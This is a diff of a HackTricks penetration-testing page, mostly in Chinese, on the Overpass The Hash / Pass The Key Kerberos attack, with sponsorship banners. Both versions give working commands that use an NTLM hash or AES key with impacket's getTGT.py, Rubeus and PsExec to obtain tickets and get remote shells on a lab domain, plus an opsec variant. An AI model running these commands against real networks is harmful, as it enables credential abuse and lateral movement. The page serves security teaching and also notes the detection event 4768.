@@ -2,42 +2,40 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中被广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ## Overpass The Hash/Pass The Key (PTK)
 
-此攻击旨在**使用用户的NTLM哈希或AES密钥请求Kerberos票据**，作为常见的通过NTLM协议的Pass The Hash的替代方法。因此，这在**禁用NTLM协议**，只允许**Kerberos作为认证协议**的网络中可能特别**有用**。
+**Overpass The Hash/Pass The Key (PTK)**攻击旨在针对传统NTLM协议受限且Kerberos认证优先的环境。该攻击利用用户的NTLM哈希或AES密钥来获取Kerberos票据，从而未经授权地访问网络中的资源。
 
-为了执行此攻击，需要**目标用户帐户的NTLM哈希（或密码）**。因此，一旦获得用户哈希，就可以为该帐户请求TGT。最后，可以**访问**用户帐户具有权限的任何服务或计算机。
-```
+要执行此攻击，初始步骤涉及获取目标用户帐户的NTLM哈希或密码。在获得此信息后，可以获取帐户的票据授予票据（TGT），使攻击者能够访问用户具有权限的服务或机器。
+
+可以使用以下命令启动该过程：
+```bash
 python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-您可以使用 **-aesKey [AES key]** 来指定使用 **AES256**。\
-您也可以将票据与其他工具一起使用，如 smbexec.py 或 wmiexec.py
+在需要AES256的情况下，可以利用`-aesKey [AES key]`选项。此外，获取的票据可以与各种工具一起使用，包括smbexec.py或wmiexec.py，从而扩大攻击范围。
 
-可能出现的问题：
+遇到诸如_PyAsn1Error_或_KDC无法找到名称_的问题通常可以通过更新Impacket库或使用主机名代替IP地址来解决，确保与Kerberos KDC兼容。
 
-* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_：通过将impacket更新到最新版本来解决。
-* _KDC can’t found the name_：通过使用主机名而不是IP地址来解决，因为Kerberos KDC无法识别IP地址。
-```
+使用Rubeus.exe的另一种命令序列展示了这种技术的另一个方面：
+```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-这种攻击类似于**Pass the Key**，但不是使用哈希来请求票据，而是窃取票据本身并用其进行身份验证。 
+这种方法与**Pass the Key**方法类似，重点是挪用并直接利用票证进行认证。值得注意的是，TGT请求的发起会触发事件`4768: A Kerberos authentication ticket (TGT) was requested`，默认情况下表示使用RC4-HMAC，尽管现代Windows系统更倾向于AES256。
 
-{% hint style="warning" %}
-当请求TGT时，会生成事件`4768: A Kerberos authentication ticket (TGT) was requested`。从上面的输出中可以看到，KeyType为**RC4-HMAC**（0x17），但Windows的默认类型现在是**AES256**（0x12）。
-{% endhint %}
+为了符合运行安全性并使用AES256，可以应用以下命令：
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
@@ -49,10 +47,10 @@ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中被宣传**吗？或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中宣传**吗？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
